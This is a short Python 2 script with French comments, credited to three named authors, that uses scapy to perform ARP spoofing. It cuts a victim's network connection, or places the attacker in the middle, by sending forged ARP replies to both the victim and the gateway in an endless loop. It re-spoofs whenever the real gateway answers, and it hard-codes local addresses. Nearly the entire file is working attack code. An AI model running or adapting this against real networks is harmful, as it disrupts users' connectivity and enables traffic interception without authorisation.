#!/usr/bin/python
# coding: utf-8
#Permet de couper des machines presentes sur le reseau
#Amandine Fouillet - Frank Chassing - Thomas Signeux

from scapy.all import *
import netifaces
from subprocess import Popen, PIPE
import threading
import re
import time 
  
#Class Thread permettant de couper la connexion a une victime ayant son adresse IP et Mac ainsi que l'adresse IP et Mac du routeur
class couperVictime(threading.Thread): 
    def __init__(self, IpVictim, MacVictim, IpGw, MacGw): 
        threading.Thread.__init__(self)
        self.Terminated = False 
	self.IpVictim = IpVictim
	self.MacVictim = MacVictim
	self.IpGw = IpGw
	self.MacGw = MacGw
    def run(self): 
	#Boucle infinie du thread permettant d'envoyer des faux paquets ARP
        while not self.Terminated: 
        #Creation du faux paquet pour envoyer a la victime
		fauxARP = ARP()
		fauxARP.op = 2
		#L'addresse IP de la source du paquet est l'IP de la gateway
		fauxARP.psrc = self.IpGw
		#L'adresse IP de destination du paquet est l'IP de la victime
		fauxARP.pdst = self.IpVictim
		#L'adresse Mac de destination du paquet est l'adresse Mac de la victime
		fauxARP.hwdst = self.MacVictim

		#Creation du faux paquet pour envoyer a la gateway
		fauxARPGW = ARP()
		fauxARPGW.op=2
		#L'addresse IP de la source du paquet est l'IP de la victime
		fauxARPGW.psrc= self.IpVictim
		#L'adresse IP de destination du paquet est l'IP de la gateway
		fauxARPGW.pdst= self.IpGw
		#L'adresse Mac de destination du paquet est l'adresse Mac de la gateway
		fauxARPGW.hwdst= self.MacGw
		
		#On envoie les deux faux ARP
		send(fauxARP)
		send(fauxARPGW)

		#Apres un moment, le gateway par defaut envoie un ARP pour donner son adresse MAC
		#La victime n'est plus trompee et la communication ne passe plus par l'attaquant
		#Pour empecher cela, on sniff la commnucation entre la gateway et la victime 
		#Des que la gateway envoie une reponse ARP, l'attaquant usurpe la victime
		sniff(filter="arp and host 192.168.0.1 or host 192.168.0.100", count=1)
        print "le thread s'est termine proprement" 
    #fonction permettant d'arrêter la boucle du thread
    def stop(self): 
        self.Terminated = True